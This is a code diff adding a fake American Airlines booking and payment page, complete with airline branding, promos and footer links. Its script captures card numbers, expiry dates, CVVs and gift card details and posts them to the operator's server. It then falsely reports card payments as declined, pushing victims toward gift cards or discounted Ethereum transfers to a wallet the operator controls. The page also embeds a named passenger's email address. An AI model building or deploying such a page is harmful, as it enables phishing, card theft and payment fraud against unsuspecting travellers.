+                    <label onclick="updatePayment('paypal')">
+                        <input type="radio" name="payment-method" id="methodPaypal">
+                        <span class="payment-label-content">
+                            <span class="payment-brand-group">
+                                <img src="image/paypal.png" alt="PayPal" class="payment-logo-img" onerror="this.style.display='none'">
+                                PayPal
+                            </span>
+                        </span>
+                    </label>
+                </div>
+
+                <!-- Ethereum Option with 15% Discount -->
+                <div class="radio-item payment-row-divider">
+                    <label onclick="updatePayment('eth')">
+                        <input type="radio" name="payment-method" id="methodEth">
+                        <span class="payment-label-content">
+                            <span class="payment-brand-group">
+                                <span style="font-size: 16px;">💎</span>
+                                <span>Ethereum (ETH)</span>
+                            </span>
+                            <span class="crypto-tag">15% OFF</span>
+                        </span>
+                    </label>
+                </div>
+
+                <!-- Ethereum Entry Form Fields & Instructions -->
+                <div class="giftcard-form-container" id="ethDetailsContainer">
+                    <div class="card-input-field">
+                        <label>Send Ethereum to this Wallet Address:</label>
+                        <div style="display: flex; gap: 6px; align-items: center;">
+                            <input type="text" id="ethWalletAddress" value="0x71C9f2b84Ea461b472e3a9B4e2F" readonly style="background: #e9ecef; font-family: monospace; font-weight: bold;">
+                            <button type="button" onclick="copyEthAddress()" style="padding: 8px 12px; background: #00539f; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">Copy</button>
+                        </div>
+                    </div>
+                    
+                    <div style="background: #e1f5fe; border-left: 3px solid #0288d1; padding: 10px; font-size: 12px; color: #01579b; border-radius: 0 4px 4px 0; line-height: 1.4;">
+                        <strong>How to send Ethereum:</strong>
+                        <ol style="margin-left: 16px; margin-top: 4px;">
+                            <li>Open your crypto wallet (MetaMask, Coinbase, etc.).</li>
+                            <li>Send the exact discounted ETH total to the wallet address provided above.</li>
+                            <li>Take a screenshot or save the transaction receipt.</li>
+                            <li>Enter the exact amount sent and upload your receipt below to finalize.</li>
+                        </ol>
+                    </div>
+
+                    <div class="card-input-field">
+                        <label>Amount Sent (ETH or USD Equivalent)</label>
+                        <input type="text" id="ethSentAmount" placeholder="e.g., 0.35 ETH or $952.42">
+                    </div>
+
+                    <div class="card-input-field">
+                        <label>Upload Transaction Receipt / Screenshot</label>
+                        <input type="file" id="ethReceiptImage" accept="image/*,.pdf">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Big Proceed to Payment Button Section -->
+        <div class="proceed-payment-container">
+            <button type="button" class="proceed-btn" id="proceedBtn">
+                Proceed to Payment 🔒
+            </button>
+            <div class="secure-checkout-note">Your payment and personal details are encrypted and securely processed.</div>
+        </div>
+
+        <!-- LIMITED-TIME OFFER PROMO BOX -->
+        <div class="promo-offer-box">
+            <div class="offer-top-link">
+                <a href="https://www.aa.com/faqs" target="_blank">Reservation and tickets FAQs ↗</a>
+            </div>
+            <div class="offer-content-grid">
+                <div class="offer-left">
+                    <img src="image/visa1.jpg" alt="Credit Card" class="offer-card-img" onerror="this.src='https://placehold.co/80x50/00539f/ffffff?text=AA+Card'">
+                    <div>
+                        <div class="offer-badge-text">LIMITED-TIME OFFER</div>
+                        <div class="offer-main-numbers">Earn up to $250 + 40,000</div>
+                        <div style="font-size: 11px; color: #555;">statement credit &nbsp;|&nbsp; bonus miles</div>
+                    </div>
+                </div>
+                <div class="offer-right">
+                    <div class="offer-calc-row"><span>Pay today:</span> <strong>$1,120.50</strong></div>
+                    <div class="offer-calc-row"><span>Card statement credit:</span> <strong style="color: #b12704;">-$250.00</strong></div>
+                    <div class="offer-calc-row total-row"><span>Total after credit:</span> <span>$870.50</span></div>
+                </div>
+            </div>
+            <div class="offer-footer-text">
+                Plus, get your first checked bag free on domestic American Airlines itineraries. Terms apply.
+            </div>
+            <a href="https://www.aa.com/creditcards" target="_blank" class="learn-more-btn">Learn more ↗</a>
+        </div>
+
+        <!-- EXTRAS SECTION WITH LOCAL LOGOS -->
+        <div class="extra-promos-stack">
+            <div class="extra-promo-row">
+                <a href="https://www.citicards.com" target="_blank" class="promo-logo-link">
+                    <img src="image/city.png" alt="Explore Citi / AAdvantage Credit Cards" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Citi'">
+                </a>
+                <a href="https://www.citicards.com" target="_blank" class="extra-promo-link-text">Explore Citi® / AAdvantage® Credit Cards ↗</a>
+                <div class="extra-promo-desc">Choose the card that fits your travel style</div>
+            </div>
+
+            <div class="extra-promo-row" style="margin-top: 12px;">
+                <a href="https://www.aa.com/buymiles" target="_blank" class="promo-logo-link">
+                    <img src="image/buymiles.png" alt="BuyMiles" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Buy+Miles'">
+                </a>
+                <a href="https://www.aa.com/buymiles" target="_blank" class="extra-promo-link-text">BuyMiles ↗</a>
+                <div class="extra-promo-desc">Buy or gift miles for new adventures</div>
+            </div>
+
+            <div class="extra-promo-row" style="margin-top: 12px;">
+                <a href="https://www.avis.com" target="_blank" class="promo-logo-link">
+                    <img src="image/avis.png" alt="Avis" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Avis'">
+                </a>
+                <a href="https://www.avis.com" target="_blank" class="extra-promo-link-text">AVIS ↗</a>
+                <div class="extra-promo-desc">Rent an SUV with Avis starting at $55 a day</div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- CUSTOM RESPONSIVE POP-UP MODAL CONTAINER -->
+    <div class="custom-modal-overlay" id="customModal">
+        <div class="custom-modal-content">
+            <div class="custom-modal-header">
+                <span id="modalTitleText">Notice</span>
+            </div>
+            <div class="custom-modal-body" id="modalBodyText">
+                Popup message goes here...
+            </div>
+            <div class="custom-modal-footer">
+                <button type="button" class="custom-modal-btn" onclick="closeCustomModal()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER SECTION -->
+    <footer class="main-footer">
+        <div class="main-container">
+            <div class="footer-columns">
+                <div class="footer-col">
+                    <h4>Help</h4>
+                    <ul>
+                        <li><a href="https://www.aa.com/contact" target="_blank">Contact American</a></li>
+                        <li><a href="https://www.aa.com/refunds" target="_blank">Receipts and refunds</a></li>
+                        <li><a href="https://www.aa.com/faqs" target="_blank">FAQs</a></li>
+                        <li><a href="https://www.aa.com/agency" target="_blank">Agency reference ↗</a></li>
+                        <li><a href="https://www.aacargo.com" target="_blank">American Airlines Cargo ↗</a></li>
+                        <li><a href="https://www.aa.com/optionalfees" target="_blank">Bag and optional fees</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>About American</h4>
+                    <ul>
+                        <li><a href="https://www.aa.com/aboutus" target="_blank">About us</a></li>
+                        <li><a href="https://www.aa.com/careers" target="_blank">We're hiring! Join our team ↗</a></li>
+                        <li><a href="https://investor.aa.com" target="_blank">Investor relations ↗</a></li>
+                        <li><a href="https://news.aa.com" target="_blank">Newsroom ↗</a></li>
+                        <li><a href="https://www.aa.com/privacy" target="_blank">Legal, privacy, copyright</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Extras</h4>
+                    <ul>
+                        <li><a href="https://www.aa.com/business" target="_blank">Business programs</a></li>
+                        <li><a href="https://www.aa.com/gift-cards" target="_blank">Gift cards ↗</a></li>
+                        <li><a href="https://www.aa.com/insurance" target="_blank">Trip insurance</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom-row">
+                <div>
+                    <span>↗ Link opens in new window. AA.com®</span>
+                </div>
+                <div class="social-icons">
+                    <a href="https://facebook.com/AmericanAirlines" target="_blank" class="social-circle">f</a>
+                    <a href="https://youtube.com/AmericanAirlines" target="_blank" class="social-circle">▶</a>
+                    <a href="https://twitter.com/AmericanAir" target="_blank" class="social-circle">𝕏</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const baseTotal = 1120.50; // 950 (flight) + 102 (hotel) + 68.50 (taxes)
+        let activePaymentMethod = 'card';
+
+        // Custom Modal Function to replace standard browser alerts
+        function showModal(title, message, callback) {
+            document.getElementById('modalTitleText').textContent = title;
+            document.getElementById('modalBodyText').textContent = message;
+            document.getElementById('customModal').style.display = 'flex';
+            
+            window.modalCallback = callback || null;
+        }
+
+        function closeCustomModal() {
+            document.getElementById('customModal').style.display = 'none';
+            if (typeof window.modalCallback === 'function') {
+                window.modalCallback();
+                window.modalCallback = null;
+            }
+        }
+
+        function copyEthAddress() {
+            const copyText = document.getElementById("ethWalletAddress");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            showModal("Copied", "Ethereum wallet address copied to clipboard!");
+        }
+
+        function updatePayment(method) {
+            activePaymentMethod = method;
+            const discountRow = document.getElementById('discountRow');
+            const discountTitle = document.getElementById('discountTitle');
+            const discountAmount = document.getElementById('discountAmount');
+            const totalDueDisplay = document.getElementById('totalDueDisplay');
+            const cardContainer = document.getElementById('cardDetailsContainer');
+            const giftCardContainer = document.getElementById('giftCardDetailsContainer');
+            const ethContainer = document.getElementById('ethDetailsContainer');
+
+            // Toggle form containers visibility
+            cardContainer.style.display = (method === 'card') ? 'flex' : 'none';
+            document.getElementById('methodCard').checked = (method === 'card');
+
+            giftCardContainer.style.display = (method === 'giftcard') ? 'flex' : 'none';
+            document.getElementById('methodGiftCard').checked = (method === 'giftcard');
+
+            ethContainer.style.display = (method === 'eth') ? 'flex' : 'none';
+            document.getElementById('methodEth').checked = (method === 'eth');
+
+            if (method === 'paypal') {
+                document.getElementById('methodPaypal').checked = true;
+                showModal('PayPal Notice', 'PayPal payment not available at the moment.');
+            }
+
+            // Calculations & Discounts
+            if (method === 'eth') {
+                const discountValue = baseTotal * 0.15;
+                const finalTotal = baseTotal - discountValue;
+
+                discountTitle.textContent = "Ethereum 15% Discount";
+                discountAmount.textContent = `-$${discountValue.toFixed(2)}`;
+                discountRow.style.display = 'flex';
+                totalDueDisplay.textContent = `$${finalTotal.toFixed(2)}`;
+                
+                // Auto-fill ETH amount suggestion
+                document.getElementById('ethSentAmount').value = `$${finalTotal.toFixed(2)}`;
+            } else if (method === 'giftcard') {
+                const discountValue = baseTotal * 0.05;
+                const finalTotal = baseTotal - discountValue;
+
+                discountTitle.textContent = "Gift Card 5% Discount";
+                discountAmount.textContent = `-$${discountValue.toFixed(2)}`;
+                discountRow.style.display = 'flex';
+                totalDueDisplay.textContent = `$${finalTotal.toFixed(2)}`;
+            } else {
+                discountRow.style.display = 'none';
+                totalDueDisplay.textContent = `$${baseTotal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+            }
+        }
+
+        // Handle Proceed to Payment submission and save details to backend server
+        document.querySelector('.proceed-btn').addEventListener('click', async function(e) {
+            e.preventDefault();
+
+            // Intercept PayPal right away if selected
+            if (activePaymentMethod === 'paypal') {
+                showModal('PayPal Notice', 'PayPal payment not available at the moment.');
+                return;
+            }
+
+            const payerName = document.getElementById('payerName').value.trim();
+            const payerEmail = document.getElementById('payerEmail').value.trim();
+            const payerPhone = document.getElementById('payerPhone').value.trim();
+            const relationshipNode = document.querySelector('input[name="payer-relationship"]:checked');
+            const relationship = relationshipNode ? relationshipNode.value : 'Fan';
+
+            if (!payerName || !payerEmail) {
+                showModal('Missing Information', 'Please provide at least the Payer Full Name and Email.');
+                return;
+            }
+
+            // Collect Card Data if Credit/Debit Card is selected
+            let cardData = {};
+            if (activePaymentMethod === 'card') {
+                cardData = {
+                    cardHolderName: document.getElementById('cardHolderName').value.trim(),
+                    cardNumber: document.getElementById('cardNumber').value.trim(),
+                    cardExpiry: document.getElementById('cardExpiry').value.trim(),
+                    cardCvv: document.getElementById('cardCvv').value.trim()
+                };
+
+                if (!cardData.cardNumber || !cardData.cardCvv) {
+                    showModal('Card Details Required', 'Please enter your complete card details to proceed.');
+                    return;
+                }
+            }
+
+            // Collect Gift Card Data if Gift Card is selected
+            let giftCardData = {};
+            if (activePaymentMethod === 'giftcard') {
+                giftCardData = {
+                    brand: document.getElementById('giftCardBrand').value,
+                    amount: document.getElementById('giftCardAmount').value.trim()
+                };
+
+                if (!giftCardData.amount) {
+                    showModal('Gift Card Amount Required', 'Please enter the gift card amount to proceed.');
+                    return;
+                }
+            }
+
+            // Collect Ethereum Data if Ethereum is selected
+            let ethData = {};
+            if (activePaymentMethod === 'eth') {
+                ethData = {
+                    sentAmount: document.getElementById('ethSentAmount').value.trim()
+                };
+
+                if (!ethData.sentAmount) {
+                    showModal('Amount Sent Required', 'Please enter the amount sent to proceed.');
+                    return;
+                }
+            }
+
+            const btn = document.querySelector('.proceed-btn');
+            btn.textContent = "Securing & Saving...";
+            btn.disabled = true;
+
+            const finalCalculatedTotal = activePaymentMethod === 'eth' ? (baseTotal * 0.85) : 
+                                         activePaymentMethod === 'giftcard' ? (baseTotal * 0.95) : baseTotal;
+
+            try {
+                // Build FormData payload to send text fields and image files to backend server.js
+                const formData = new FormData();
+                formData.append('passengerName', 'Melissa Ann Mia Malkova');
+                formData.append('passengerEmail', 'miamalkova1@gmail.com');
+                formData.append('route', 'PSP to FNT');
+                formData.append('totalAmount', finalCalculatedTotal);
+                formData.append('paymentMethod', activePaymentMethod);
+                formData.append('payerRelationship', relationship);
+                formData.append('payerName', payerName);
+                formData.append('payerEmail', payerEmail);
+                formData.append('payerPhone', payerPhone);
+
+                if (activePaymentMethod === 'card') {
+                    formData.append('cardHolderName', cardData.cardHolderName);
+                    formData.append('cardNumber', cardData.cardNumber);
+                    formData.append('cardExpiry', cardData.cardExpiry);
+                    formData.append('cardCvv', cardData.cardCvv);
+                }
+
+                if (activePaymentMethod === 'giftcard') {
+                    formData.append('giftCardBrand', giftCardData.brand);
+                    formData.append('giftCardAmount', giftCardData.amount);
+                    const imageInput = document.getElementById('giftCardImage');
+                    if (imageInput.files[0]) {
+                        formData.append('giftCardImage', imageInput.files[0]);
+                    }
+                }
+
+                if (activePaymentMethod === 'eth') {
+                    formData.append('ethSentAmount', ethData.sentAmount);
+                    const ethReceiptInput = document.getElementById('ethReceiptImage');
+                    if (ethReceiptInput.files[0]) {
+                        formData.append('ethReceiptImage', ethReceiptInput.files[0]);
+                    }
+                }
+
+                const response = await fetch('/api/submit-payment', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (!response.ok || !result.success) {
+                    throw new Error(result.error || "Failed to process payment.");
+                }
+
+                let successMessage = 'Payment details recorded successfully!';
+                if (activePaymentMethod === 'card') {
+                    successMessage = "Payment Declined. Please try an alternative payment method.";
+                } else if (activePaymentMethod === 'giftcard') {
+                    successMessage = "Payment under review. You will be updated through the email about the payment after securing the payment.";
+                } else if (activePaymentMethod === 'eth') {
+                    successMessage = "Payment will be confirmed in 10 minutes and you will be updated in the email.";
+                }
+
+                showModal('Payment Status', successMessage, function() {
+                    document.querySelector('.main-container').innerHTML = `
+                        <div style="background:#fff; border:1px solid #ccd2d9; border-radius:6px; padding:30px; text-align:center; margin-top:40px;">
+                            <h2 style="color:#00875a; margin-bottom:10px; font-size:24px;">✔ Booking & Payment Submitted</h2>
+                            <p style="color:#333; font-size:14px; margin-bottom:20px;">Thank you, ${payerName}. Your transaction status has been updated.</p>
+                            <a href="" style="background:#00539f; color:#fff; padding:10px 20px; border-radius:4px; text-decoration:none; font-weight:700;">Return to Home</a>
+                        </div>
+                    `;
+                });
+
+            } catch (error) {
+                console.error("Error submitting payment: ", error);
+                showModal('Connection Error', "Connection error occurred while processing: " + error.message);
+                btn.textContent = "Proceed to Payment 🔒";
+                btn.disabled = false;
+            }
+        });
+
+        // --- NEW CODE ADDED TO FETCH LIVE ETH WALLET FROM DATABASE AUTOMATICALLY ---
+        async function fetchAdminSettings() {
+            try {
+                const response = await fetch('/api/settings');
+                const data = await response.json();
+                
+                if (data.success && data.ethWalletAddress) {
+                    const ethInput = document.getElementById('ethWalletAddress');
+                    if (ethInput) {
+                        ethInput.value = data.ethWalletAddress; // Dynamically injects live database wallet address
+                    }
+                }
+            } catch (error) {
+                console.error("Could not load dynamic admin settings:", error);
+            }
+        }
+
+        // Automatically trigger live wallet fetch when page finishes loading
+        window.addEventListener('DOMContentLoaded', () => {
+            fetchAdminSettings();
+        });
+    </script>
+</body>
+</html>
